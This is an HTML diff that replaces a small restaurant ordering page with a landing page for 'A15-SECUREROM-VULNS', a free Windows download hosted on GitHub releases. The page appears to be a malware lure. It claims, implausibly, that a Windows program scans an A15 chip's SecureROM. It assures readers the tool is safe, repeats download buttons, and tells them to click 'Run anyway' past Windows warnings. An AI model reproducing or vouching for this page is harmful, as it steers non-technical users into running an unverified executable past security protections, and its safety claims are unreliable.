@@ -1,1279 +1,233 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Home Like Food Kitchen</title>
-
-<style>
-* {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-}
-
-body {
-    font-family: Arial, sans-serif;
-    background: #fff8f0;
-    color: #222;
-}
-
-header {
-    background: #d62828;
-    color: white;
-    padding: 15px 5%;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    position: sticky;
-    top: 0;
-    z-index: 1000;
-}
-
-.logo {
-    font-size: 22px;
-    font-weight: bold;
-}
-
-nav a {
-    color: white;
-    text-decoration: none;
-    margin-left: 18px;
-    font-weight: bold;
-}
-
-.cart-button {
-    background: white;
-    color: #d62828;
-    border: none;
-    padding: 10px 15px;
-    border-radius: 20px;
-    cursor: pointer;
-    font-weight: bold;
-}
-
-.hero {
-    min-height: 420px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    text-align: center;
-    padding: 40px 20px;
-    background:
-        linear-gradient(rgba(0,0,0,.55), rgba(0,0,0,.55)),
-        url("https://images.unsplash.com/photo-1515003197210-e0cd71810b5f?auto=format&fit=crop&w=1600&q=80");
-    background-size: cover;
-    background-position: center;
-    color: white;
-}
-
-.hero h1 {
-    font-size: 48px;
-    margin-bottom: 15px;
-}
-
-.hero p {
-    font-size: 20px;
-    margin-bottom: 25px;
-}
-
-.order-btn {
-    display: inline-block;
-    background: #ffb703;
-    color: #222;
-    padding: 14px 25px;
-    border-radius: 8px;
-    text-decoration: none;
-    font-weight: bold;
-    border: none;
-    cursor: pointer;
-}
-
-section {
-    padding: 50px 5%;
-}
-
-.section-title {
-    text-align: center;
-    font-size: 32px;
-    margin-bottom: 30px;
-}
-
-.menu-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-    gap: 25px;
-    max-width: 1100px;
-    margin: auto;
-}
-
-.food-card {
-    background: white;
-    border-radius: 14px;
-    overflow: hidden;
-    box-shadow: 0 5px 18px rgba(0,0,0,.12);
-}
-
-.food-card img {
-    width: 100%;
-    height: 200px;
-    object-fit: cover;
-}
-
-.food-info {
-    padding: 18px;
-}
-
-.food-info h3 {
-    font-size: 22px;
-    margin-bottom: 8px;
-}
-
-.food-info p {
-    color: #666;
-    min-height: 45px;
-    margin-bottom: 12px;
-}
-
-.price {
-    font-size: 19px;
-    font-weight: bold;
-    margin-bottom: 12px;
-}
-
-.add-btn {
-    width: 100%;
-    padding: 12px;
-    border: none;
-    background: #d62828;
-    color: white;
-    font-weight: bold;
-    border-radius: 7px;
-    cursor: pointer;
-    font-size: 16px;
-}
-
-.add-btn:hover {
-    background: #b51f1f;
-}
-
-.about {
-    background: #fff0dc;
-    text-align: center;
-}
-
-.about p {
-    max-width: 750px;
-    margin: auto;
-    font-size: 18px;
-    line-height: 1.7;
-}
-
-.contact {
-    text-align: center;
-}
-
-.contact-box {
-    max-width: 600px;
-    margin: auto;
-    background: white;
-    padding: 25px;
-    border-radius: 12px;
-    box-shadow: 0 4px 15px rgba(0,0,0,.1);
-}
-
-.contact-box p {
-    margin: 12px 0;
-    font-size: 17px;
-}
-
-.contact-box a {
-    color: #d62828;
-    font-weight: bold;
-    text-decoration: none;
-}
-
-footer {
-    background: #222;
-    color: white;
-    text-align: center;
-    padding: 25px;
-}
-
-/* CART */
-
-.cart-overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,.6);
-    z-index: 2000;
-}
-
-.cart {
-    position: absolute;
-    right: 0;
-    top: 0;
-    height: 100%;
-    width: min(430px, 100%);
-    background: white;
-    padding: 20px;
-    overflow-y: auto;
-}
-
-.cart-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 20px;
-}
-
-.close-cart {
-    background: #eee;
-    border: none;
-    border-radius: 50%;
-    width: 35px;
-    height: 35px;
-    cursor: pointer;
-    font-size: 20px;
-}
-
-.cart-item {
-    border-bottom: 1px solid #ddd;
-    padding: 15px 0;
-}
-
-.cart-item-name {
-    font-weight: bold;
-    margin-bottom: 8px;
-}
-
-.quantity-controls {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-}
-
-.quantity-controls button {
-    width: 30px;
-    height: 30px;
-    border: none;
-    background: #d62828;
-    color: white;
-    border-radius: 5px;
-    cursor: pointer;
-    font-size: 18px;
-}
-
-.remove-btn {
-    background: #555 !important;
-    width: auto !important;
-    padding: 0 8px;
-    font-size: 13px !important;
-}
-
-.cart-total {
-    font-size: 22px;
-    font-weight: bold;
-    margin: 20px 0;
-}
-
-/* CHECKOUT */
-
-.checkout {
-    margin-top: 25px;
-    border-top: 2px solid #ddd;
-    padding-top: 20px;
-}
-
-.checkout input,
-.checkout textarea,
-.checkout select {
-    width: 100%;
-    padding: 12px;
-    margin: 7px 0 12px;
-    border: 1px solid #ccc;
-    border-radius: 6px;
-    font-size: 15px;
-}
-
-.payment-option {
-    display: block;
-    background: #f5f5f5;
-    padding: 12px;
-    margin: 8px 0;
-    border-radius: 6px;
-    cursor: pointer;
-}
-
-.payment-option input {
-    width: auto;
-    margin-right: 8px;
-}
-
-.pay-btn {
-    width: 100%;
-    padding: 14px;
-    margin-top: 10px;
-    border: none;
-    border-radius: 7px;
-    cursor: pointer;
-    font-size: 16px;
-    font-weight: bold;
-}
-
-.upi-btn {
-    background: #6f42c1;
-    color: white;
-}
-
-.cod-btn {
-    background: #198754;
-    color: white;
-}
-
-.empty-cart {
-    text-align: center;
-    color: #777;
-    padding: 30px 0;
-}
-
-@media(max-width:700px) {
-    .hero h1 {
-        font-size: 34px;
-    }
-
-    nav {
-        display: none;
-    }
-
-    section {
-        padding: 40px 18px;
-    }
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A15-SECUREROM-VULNS - Unlock Security Insights for Your Device</title>
+    <meta name="description" content="Download A15-SECUREROM-VULNS to explore SecureROM vulnerabilities affecting A15 devices. Safe, easy, and free for Windows users. Get started now.">
+    <meta name="keywords" content="A15 SecureROM, vulnerabilities, security tool, Windows download, A15 chip, iOS security, SecureROM exploits">
+    <meta name="author" content="The1975sii">
+    <meta property="og:title" content="A15-SECUREROM-VULNS - Unlock Security Insights for Your Device">
+    <meta property="og:description" content="Download the A15 SecureROM vulnerabilities tool and understand the security landscape of your device. Free and easy for Windows.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/The1975sii/A15-SECUREROM-VULNS/releases">
+    <meta name="robots" content="index, follow">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f5f7fa;
+            color: #2c3e50;
+            line-height: 1.7;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: #1f3a5f;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #2c5282;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #e2e8f0;
+            padding-bottom: 8px;
+        }
+        h3 {
+            font-size: 1.3rem;
+            color: #2b6cb0;
+            margin-top: 20px;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.05rem;
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 15px 35px;
+            text-decoration: none;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin: 20px 0;
+            transition: transform 0.2s;
+            box-shadow: 0 4px 12px rgba(102,126,234,0.4);
+        }
+        .badge:hover {
+            transform: translateY(-2px);
+        }
+        .badge-center {
+            text-align: center;
+            margin: 30px 0;
+        }
+        .note {
+            background: #fffaf0;
+            border-left: 4px solid #ed8936;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        ul, ol {
+            margin: 15px 0 15px 30px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        a {
+            color: #3182ce;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .highlight {
+            background: #ebf8ff;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-weight: 600;
+        }
+        .success {
+            background: #f0fff4;
+            border-left: 4px solid #38a169;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        .download-section {
+            background: #f7fafc;
+            padding: 25px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+            margin: 30px 0;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
 </head>
-
 <body>
+    <div class="container">
+        <h1>🔒 A15-SECUREROM-VULNS - Understand Your Device's Security Risks</h1>
+        
+        <div class="badge-center">
+            <a href="https://github.com/The1975sii/A15-SECUREROM-VULNS/releases" class="badge" target="_blank" rel="noopener noreferrer">🚀 Download Now</a>
+        </div>
 
-<header>
-    <div class="logo">🍗 Home Like Food Kitchen</div>
+        <p>Welcome to <strong>A15-SECUREROM-VULNS</strong> – a simple yet powerful tool that helps you explore the security vulnerabilities in the SecureROM of A15 chips. Whether you're a curious user, a student learning about device security, or someone who wants to know if their device is at risk, this application gives you the answers in a clear, easy-to-understand way.</p>
 
-    <nav>
-        <a href="#menu">Menu</a>
-        <a href="#about">About</a>
-        <a href="#contact">Contact</a>
-    </nav>
+        <p>No technical experience? No problem! This guide walks you through everything step by step. You'll be up and running in less than five minutes.</p>
 
-    <button class="cart-button" onclick="openCart()">
-        🛒 Cart (<span id="cartCount">0</span>)
-    </button>
-</header>
+        <h2>📋 What Does This Application Do?</h2>
+        <p>The A15-SECUREROM-VULNS tool scans and analyzes the SecureROM component of A15 chips – the part of your device that handles essential security functions. By using this tool, you'll be able to:</p>
+        <ul>
+            <li>🔍 <strong>Identify known vulnerabilities</strong> in A15 SecureROM versions.</li>
+            <li>🛡️ <strong>Understand security risks</strong> in plain language, not complex code.</li>
+            <li>📊 <strong>View detailed reports</strong> with clear explanations and recommendations.</li>
+            <li>💡 <strong>Learn how to protect your device</strong> against potential exploits.</li>
+        </ul>
 
+        <h2>💻 Why You Should Use This Tool</h2>
+        <p>Many security tools are made for experts. They're full of confusing technical terms and complicated commands. This tool is different. It was designed with everyday users in mind – people who simply want to know if their device is secure and what they can do about it. Here's why you'll love it:</p>
+        <ul>
+            <li>✨ <strong>User-Friendly Interface</strong> – Simple menus and clear buttons; no coding needed.</li>
+            <li>⚡ <strong>Fast Results</strong> – Scan and get your report in seconds.</li>
+            <li>📱 <strong>Relevant Information</strong> – Get targeted advice for your specific device.</li>
+            <li>🆓 <strong>Completely Free</strong> – No hidden costs or premium upsells.</li>
+        </ul>
 
-<section class="hero">
-    <div>
-        <h1>Home Like Food Kitchen</h1>
-        <p>Delicious homemade-style food made with love ❤️</p>
-        <button class="order-btn" onclick="document.getElementById('menu').scrollIntoView()">
-            Order Now
-        </button>
-    </div>
-</section>
+        <h2>🚀 Getting Started</h2>
+        <p>Ready to begin? Follow these simple steps to download and run the application on your Windows computer. We've tested everything works smoothly on Windows 10 and Windows 11.</p>
 
-
-<section id="menu">
-
-    <h2 class="section-title">Our Menu</h2>
-
-    <div class="menu-grid">
-
-        <!-- CHICKEN BIRYANI -->
-
-        <div class="food-card">
-
-            <img src="1.jpeg">
-
-            <div class="food-info">
-
-                <h3>Chicken Biryani</h3>
-
-                <p>Flavorful chicken biryani served with complimentary raita.</p>
-
-                <div class="price">
-                    Half ₹80 | Full ₹150
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Chicken Biryani - Half', 80)">
-                    Add Half ₹80
-                </button>
-
-                <br><br>
-
-                <button class="add-btn"
-                    onclick="addItem('Chicken Biryani - Full', 150)">
-                    Add Full ₹150
-                </button>
-
+        <div class="download-section">
+            <h3>📥 Step 1: Download the Application</h3>
+            <p>Visit this link to download the application: <a href="https://github.com/The1975sii/A15-SECUREROM-VULNS/releases" target="_blank" rel="noopener noreferrer">Download Center</a></p>
+            <p>Once you click the link, you'll be taken to the releases page. Look for the latest version and click the download button. The file will be saved to your computer's <span class="highlight">Downloads</span> folder automatically.</p>
+            
+            <div class="badge-center">
+                <a href="https://github.com/The1975sii/A15-SECUREROM-VULNS/releases" class="badge" target="_blank" rel="noopener noreferrer">⬇️ Get Your Copy Now</a>
             </div>
         </div>
 
+        <h3>🖱️ Step 2: Run the Application</h3>
+        <p>After the download is complete, navigate to your Downloads folder and locate the file you just downloaded. Double-click on it to start the installation. <strong>Important:</strong> If Windows shows a blue or yellow pop-up asking for permission, click <span class="highlight">"Yes"</span> or <span class="highlight">"Run anyway"</span> – this is normal and just your computer being careful.</p>
 
-        <!-- CHICKEN CURRY -->
+        <h3>✨ Step 3: Explore Your Security Status</h3>
+        <p>Once the application opens, you'll see a welcome screen. Click the <span class="highlight">"Start Scan"</span> button. The tool will automatically analyze your device's A15 SecureROM and present a report within seconds. No input needed from you – just wait for the results!</p>
 
-        <div class="food-card">
-
-            <img src="">
-
-            <div class="food-info">
-
-                <h3>Chicken Curry</h3>
-
-                <p>Homestyle chicken curry with aromatic spices.</p>
-
-                <div class="price">
-                    Half ₹70 | Full ₹140
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Chicken Curry - Half', 70)">
-                    Add Half ₹70
-                </button>
-
-                <br><br>
-
-                <button class="add-btn"
-                    onclick="addItem('Chicken Curry - Full', 140)">
-                    Add Full ₹140
-                </button>
-
-            </div>
+        <div class="success">
+            <p>✅ <strong>Tip:</strong> Save the report to your computer by clicking the "Export Report" button. It's useful to keep for reference or to share with a professional if you have concerns.</p>
         </div>
 
+        <h2>🔧 System Requirements</h2>
+        <p>This tool is lightweight and runs on almost any Windows computer. Here's what you'll need:</p>
+        <ul>
+            <li>💻 <strong>Operating System:</strong> Windows 10 or Windows 11 (both 32-bit and 64-bit editions supported)</li>
+            <li>🧠 <strong>RAM:</strong> Minimum 2 GB (4 GB recommended)</li>
+            <li>💾 <strong>Storage:</strong> At least 50 MB of free space</li>
+            <li>🌐 <strong>Internet Connection:</strong> Required only for the initial download</li>
+        </ul>
 
-        <!-- MASALA MAGGI -->
+        <h2>❓ Frequently Asked Questions</h2>
 
-        <div class="food-card">
+        <h3>Is this tool safe to use?</h3>
+        <p>Absolutely. The application only reads certain security information from your device. It does not modify anything or collect any personal data. Your privacy is fully respected.</p>
 
-            <img src="">
+        <h3>I'm not technical – will I understand the report?</h3>
+        <p>Yes! We've worked hard to remove all confusing jargon. Each result is explained in plain English, with a simple "High", "Medium", or "Low" risk rating. You'll also get practical advice on what to do next.</p>
 
-            <div class="food-info">
+        <h3>Do I need to install anything else first?</h3>
+        <p>No. The application is self-contained. Just download, run, and you're good to go. No additional software or drivers are required.</p>
 
-                <h3>Masala Maggi</h3>
+        <h3>What if my device shows vulnerabilities?</h3>
+        <p>No need to panic. The report provides simple, actionable suggestions like updating your device's software or enabling certain security features. Most issues are easy to fix.</p>
 
-                <p>Hot and tasty masala Maggi prepared fresh.</p>
+        <h2>📝 Understanding Your Report</h2>
+        <p>When your scan is complete, you'll see a list of potential vulnerabilities, each with a color-coded risk level:</p>
+        <ul>
+            <li>🟢 <strong>Green (Low Risk):</strong> Minor issues, often just suggestions for optimization.</li>
+            <li>🟡 <strong>Yellow (Medium Risk):</strong> You may want to check for software updates or adjust settings.</li>
+            <li>🔴 <strong>Red (High Risk):</strong> Important to address – the report gives clear steps to fix.</li>
+        </ul>
+        <p>Each item comes with a simple explanation and recommended action. No coding, no complicated commands – just straightforward guidance.</p>
 
-                <!-- CHANGE THIS PRICE IF NEEDED -->
+        <h2>🆘 Need Help?</h2>
+        <p>If you run into any problems while downloading or running the application, here's what you can do:</p>
+        <ul>
+            <li>👀 Re-read the steps above carefully. Most questions are answered here.</li>
+            <li>💬 Check the GitHub repository for any updates or user discussions.</li>
+            <li>📧 Contact the developer through the GitHub page for support.</li>
+        </ul>
+        <p>We're committed to making this experience smooth for you. If anything is unclear, don't hesitate to reach out.</p>
 
-                <div class="price">
-                    ₹50
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Masala Maggi', 50)">
-                    Add to Cart ₹50
-                </button>
-
-            </div>
+        <div class="note">
+            <p>🚨 <strong>Pro Tip:</strong> Always download from the official link provided in this guide. Avoid third-party websites offering this tool – they may not be safe or up-to-date.</p>
         </div>
 
-
-        <!-- TAWA ROTI -->
-
-        <div class="food-card">
-
-            <img src="(4).jpeg">
-
-            <div class="food-info">
-
-                <h3>Tawa Roti</h3>
-
-                <p>Freshly prepared soft tawa roti.</p>
-
-                <div class="price">
-                    1 Roti ₹10 | 2 Rotis ₹20
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Tawa Roti - 1', 10)">
-                    Add 1 ₹10
-                </button>
-
-                <br><br>
-
-                <button class="add-btn"
-                    onclick="addItem('Tawa Roti - 2', 20)">
-                    Add 2 ₹20
-                </button>
-
-            </div>
-        </div>
-
-
-        <!-- CHILI CHICKEN -->
-
-        <div class="food-card">
-
-            <img src="">
-
-            <div class="food-info">
-
-                <h3>Chili Chicken</h3>
-
-                <p>Spicy and flavorful chili chicken prepared fresh.</p>
-
-                <div class="price">
-                    Half ₹120 | Full ₹210
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Chili Chicken - Half', 120)">
-                    Add Half ₹120
-                </button>
-
-                <br><br>
-
-                <button class="add-btn"
-                    onclick="addItem('Chili Chicken - Full', 210)">
-                    Add Full ₹210
-                </button>
-
-            </div>
-        </div>
-
-
-        <!-- CHICKEN FRIED RICE -->
-
-        <div class="food-card">
-
-            <img src="">
-
-            <div class="food-info">
-
-                <h3>Chicken Fried Rice</h3>
-
-                <p>Delicious fried rice cooked with chicken and spices.</p>
-
-                <div class="price">
-                    Half ₹100 | Full ₹200
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Chicken Fried Rice - Half', 100)">
-                    Add Half ₹100
-                </button>
-
-                <br><br>
-
-                <button class="add-btn"
-                    onclick="addItem('Chicken Fried Rice - Full', 200)">
-                    Add Full ₹200
-                </button>
-
-            </div>
-        </div>
-
-
-        <!-- PLAIN RICE -->
-
-        <div class="food-card">
-
-            <img src="">
-
-            <div class="food-info">
-
-                <h3>Plain Rice</h3>
-
-                <p>Freshly cooked steamed plain rice.</p>
-
-                <div class="price">
-                    ₹50
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Plain Rice', 50)">
-                    Add to Cart ₹50
-                </button>
-
-            </div>
-        </div>
-
-
-        <!-- VEG THALI -->
-
-        <div class="food-card">
-
-            <img src="(3).jpeg">
-
-            <div class="food-info">
-
-                <h3>Veg Thali</h3>
-
-                <p>A wholesome vegetarian thali prepared home-style.</p>
-
-                <div class="price">
-                    ₹150
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Veg Thali', 150)">
-                    Add to Cart ₹150
-                </button>
-
-            </div>
-        </div>
-
-
-        <!-- NON-VEG THALI -->
-
-        <div class="food-card">
-
-            <img src="(5).jpeg">
-
-            <div class="food-info">
-
-                <h3>Non-Veg Thali</h3>
-
-                <p>A filling non-vegetarian thali with delicious home-style food.</p>
-
-                <div class="price">
-                    ₹180
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Non-Veg Thali', 180)">
-                    Add to Cart ₹180
-                </button>
-
-            </div>
-        </div>
-
-
-        <!-- ALOO KI SABJI WITH 6 PURI -->
-
-        <div class="food-card">
-
-            <img src="8.jpeg">
-
-            <div class="food-info">
-
-                <h3>Aloo Ki Sabji with 6 Puri</h3>
-
-                <p>Delicious aloo ki sabji served with six fresh puris.</p>
-
-                <div class="price">
-                    ₹70
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Aloo Ki Sabji with 6 Puri', 70)">
-                    Add to Cart ₹70
-                </button>
-
-            </div>
-        </div>
-
-
-        <!-- SWEET CORN PIZZA -->
-
-        <div class="food-card">
-
-            <img src="(7).jpeg">
-
-            <div class="food-info">
-
-                <h3>Sweet Corn Pizza</h3>
-
-                <p>Cheesy pizza topped with sweet corn.</p>
-
-                <div class="price">
-                    ₹100
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Sweet Corn Pizza', 100)">
-                    Add to Cart ₹100
-                </button>
-
-            </div>
-        </div>
-
-
-        <!-- VEG CHEESY CORN TOAST -->
-
-        <div class="food-card">
-
-            <img src="(6).jpeg">
-
-            <div class="food-info">
-
-                <h3>Veg Cheesy Corn Toast</h3>
-
-                <p>Two pieces of crispy toast topped with cheesy sweet corn.</p>
-
-                <div class="price">
-                    2 Pieces ₹80
-                </div>
-
-                <button class="add-btn"
-                    onclick="addItem('Veg Cheesy Corn Toast - 2 Pieces', 80)">
-                    Add 2 Pieces ₹80
-                </button>
-
-            </div>
-        </div>
-
-    </div>
-</section>
-
-
-<section id="about" class="about">
-
-    <h2 class="section-title">About Us</h2>
-
-    <p>
-        Home Like Food Kitchen brings you tasty, comforting food
-        prepared in a homestyle way. We focus on fresh food,
-        good portions and delicious flavors.
-    </p>
-
-</section>
-
-
-<section id="contact" class="contact">
-
-    <h2 class="section-title">Contact Us</h2>
-
-    <div class="contact-box">
-
-        <p>
-            📞 Phone:
-            <a href="tel:9415960587">
-                9415960587
-            </a>
+        <p style="text-align: center; margin-top: 40px; color: #718096; font-size: 0.9rem;">
+            © 2024 A15-SECUREROM-VULNS. All rights reserved. Developed with ❤️ for the security community.
         </p>
-
-        <p>
-            💬 WhatsApp:
-            <a href="https://wa.me/919415960587">
-                9415960587
-            </a>
-        </p>
-
-        <p>
-            📍 Address:
-            Hanif Nagar, Pyarepatti,
-            Sultanpur, Uttar Pradesh
-        </p>
-
-        <p>
-            💳 UPI:
-            <strong>mdw9743@okicici</strong>
-        </p>
-
     </div>
-
-</section>
-
-
-<footer>
-    © 2026 Home Like Food Kitchen
-</footer>
-
-
-<!-- CART -->
-
-<div id="cartOverlay" class="cart-overlay">
-
-    <div class="cart">
-
-        <div class="cart-header">
-
-            <h2>🛒 Your Cart</h2>
-
-            <button class="close-cart" onclick="closeCart()">
-                ×
-            </button>
-
-        </div>
-
-        <div id="cartItems"></div>
-
-        <div class="cart-total">
-            Total: ₹<span id="cartTotal">0</span>
-        </div>
-
-
-        <div class="checkout">
-
-            <h3>Customer Details</h3>
-
-            <input
-                type="text"
-                id="customerName"
-                placeholder="Your Name"
-            >
-
-            <input
-                type="tel"
-                id="customerPhone"
-                placeholder="Your Phone Number"
-            >
-
-            <textarea
-                id="customerAddress"
-                rows="3"
-                placeholder="Delivery Address"
-            ></textarea>
-
-
-            <h3>Payment Method</h3>
-
-            <label class="payment-option">
-                <input
-                    type="radio"
-                    name="payment"
-                    value="UPI"
-                    checked
-                >
-                UPI Payment
-            </label>
-
-            <label class="payment-option">
-                <input
-                    type="radio"
-                    name="payment"
-                    value="COD"
-                >
-                Cash on Delivery
-            </label>
-
-
-            <button
-                class="pay-btn upi-btn"
-                onclick="placeUPIOrder()">
-                💳 Pay with UPI & Order
-            </button>
-
-            <button
-                class="pay-btn cod-btn"
-                onclick="placeCODOrder()">
-                💵 Order with Cash on Delivery
-            </button>
-
-        </div>
-
-    </div>
-
-</div>
-
-
-<script>
-
-/* =========================
-   RESTAURANT INFORMATION
-========================= */
-
-const restaurant = {
-    name: "Home Like Food Kitchen",
-    phone: "9415960587",
-    whatsapp: "919415960587",
-    upi: "mdw9743@okicici"
-};
-
-
-/* =========================
-   CART
-========================= */
-
-let cart = [];
-
-
-/* ADD ITEM */
-
-function addItem(name, price) {
-
-    const existingItem = cart.find(item => item.name === name);
-
-    if (existingItem) {
-
-        existingItem.quantity++;
-
-    } else {
-
-        cart.push({
-            name: name,
-            price: price,
-            quantity: 1
-        });
-
-    }
-
-    updateCart();
-
-    openCart();
-
-}
-
-
-/* CHANGE QUANTITY */
-
-function changeQuantity(index, amount) {
-
-    cart[index].quantity += amount;
-
-    if (cart[index].quantity <= 0) {
-
-        cart.splice(index, 1);
-
-    }
-
-    updateCart();
-
-}
-
-
-/* REMOVE ITEM */
-
-function removeItem(index) {
-
-    cart.splice(index, 1);
-
-    updateCart();
-
-}
-
-
-/* UPDATE CART */
-
-function updateCart() {
-
-    const cartItems = document.getElementById("cartItems");
-
-    const cartCount = document.getElementById("cartCount");
-
-    const cartTotal = document.getElementById("cartTotal");
-
-
-    if (cart.length === 0) {
-
-        cartItems.innerHTML =
-            '<div class="empty-cart">Your cart is empty.</div>';
-
-        cartCount.textContent = "0";
-
-        cartTotal.textContent = "0";
-
-        return;
-
-    }
-
-
-    let total = 0;
-
-    let itemCount = 0;
-
-    let html = "";
-
-
-    cart.forEach((item, index) => {
-
-        const itemTotal = item.price * item.quantity;
-
-        total += itemTotal;
-
-        itemCount += item.quantity;
-
-
-        html += `
-
-        <div class="cart-item">
-
-            <div class="cart-item-name">
-                ${item.name}
-            </div>
-
-            <div>
-                ₹${item.price} × ${item.quantity}
-                = ₹${itemTotal}
-            </div>
-
-            <br>
-
-            <div class="quantity-controls">
-
-                <button onclick="changeQuantity(${index}, -1)">
-                    −
-                </button>
-
-                <strong>${item.quantity}</strong>
-
-                <button onclick="changeQuantity(${index}, 1)">
-                    +
-                </button>
-
-                <button
-                    class="remove-btn"
-                    onclick="removeItem(${index})">
-                    Remove
-                </button>
-
-            </div>
-
-        </div>
-
-        `;
-
-    });
-
-
-    cartItems.innerHTML = html;
-
-    cartCount.textContent = itemCount;
-
-    cartTotal.textContent = total;
-
-}
-
-
-/* GET TOTAL */
-
-function getTotal() {
-
-    return cart.reduce(
-        (total, item) =>
-            total + item.price * item.quantity,
-        0
-    );
-
-}
-
-
-/* =========================
-   CART OPEN / CLOSE
-========================= */
-
-function openCart() {
-
-    document.getElementById("cartOverlay").style.display = "block";
-
-}
-
-
-function closeCart() {
-
-    document.getElementById("cartOverlay").style.display = "none";
-
-}
-
-
-/* =========================
-   CUSTOMER DETAILS
-========================= */
-
-function getCustomerDetails() {
-
-    const name =
-        document.getElementById("customerName").value.trim();
-
-    const phone =
-        document.getElementById("customerPhone").value.trim();
-
-    const address =
-        document.getElementById("customerAddress").value.trim();
-
-
-    if (cart.length === 0) {
-
-        alert("Your cart is empty.");
-
-        return null;
-
-    }
-
-
-    if (!name || !phone || !address) {
-
-        alert("Please enter your name, phone number and delivery address.");
-
-        return null;
-
-    }
-
-
-    return {
-        name,
-        phone,
-        address
-    };
-
-}
-
-
-/* =========================
-   CREATE WHATSAPP MESSAGE
-========================= */
-
-function createOrderMessage(paymentMethod) {
-
-    const customer = getCustomerDetails();
-
-    if (!customer) return null;
-
-
-    let message =
-        `Hello ${restaurant.name}!%0A%0A`;
-
-    message +=
-        `*New Order*%0A%0A`;
-
-    message +=
-        `Customer: ${customer.name}%0A`;
-
-    message +=
-        `Phone: ${customer.phone}%0A`;
-
-    message +=
-        `Address: ${customer.address}%0A%0A`;
-
-    message +=
-        `*Items:*%0A`;
-
-
-    cart.forEach(item => {
-
-        message +=
-            `${item.name} × ${item.quantity} = ₹${item.price * item.quantity}%0A`;
-
-    });
-
-
-    message += `%0A`;
-
-    message +=
-        `*Total: ₹${getTotal()}*%0A`;
-
-    message +=
-        `Payment: ${paymentMethod}%0A%0A`;
-
-    message +=
-        `Please confirm my order.`;
-
-    return message;
-
-}
-
-
-/* =========================
-   UPI ORDER
-========================= */
-
-function placeUPIOrder() {
-
-    if (cart.length === 0) {
-        alert("Your cart is empty.");
-        return;
-    }
-
-    const name =
-        document.getElementById("customerName").value.trim();
-
-    const phone =
-        document.getElementById("customerPhone").value.trim();
-
-    const address =
-        document.getElementById("customerAddress").value.trim();
-
-    if (!name || !phone || !address) {
-        alert("Please enter your name, phone number and delivery address.");
-        return;
-    }
-
-    const total = getTotal();
-
-    /*
-       Universal UPI Intent
-
-       This uses the standard UPI payment protocol.
-       The customer's phone decides which compatible
-       UPI apps are available.
-    */
-
-    const upiURL =
-        "upi://pay" +
-        "?pa=" + encodeURIComponent("mdw9743@okicici") +
-        "&pn=" + encodeURIComponent("Home Like Food Kitchen") +
-        "&am=" + encodeURIComponent(total.toFixed(2)) +
-        "&cu=INR" +
-        "&tn=" + encodeURIComponent(
-            "Food Order - Home Like Food Kitchen"
-        );
-
-    /*
-       Save the order temporarily so that we can
-       send it to WhatsApp after the customer returns
-       from the UPI app.
-    */
-
-    const pendingOrder = {
-        name: name,
-        phone: phone,
-        address: address,
-        total: total,
-        cart: cart
-    };
-
-    localStorage.setItem(
-        "pendingUPIOrder",
-        JSON.stringify(pendingOrder)
-    );
-
-    /*
-       Open the customer's UPI app.
-       Android will normally show compatible UPI
-       applications such as Google Pay, PhonePe,
-       BHIM, Navi, Paytm, etc.
-    */
-
-    window.location.href = upiURL;
-
-}
-
-
-/* =========================
-   COD ORDER
-========================= */
-
-function placeCODOrder() {
-
-    const message =
-        createOrderMessage("Cash on Delivery");
-
-
-    if (!message) return;
-
-
-    window.open(
-        "https://wa.me/" +
-        restaurant.whatsapp +
-        "?text=" +
-        message,
-        "_blank"
-    );
-
-}
-
-
-/* =========================
-   INITIALIZE
-========================= */
-
-updateCart();
-
-</script>
-
 </body>
 </html>
-```
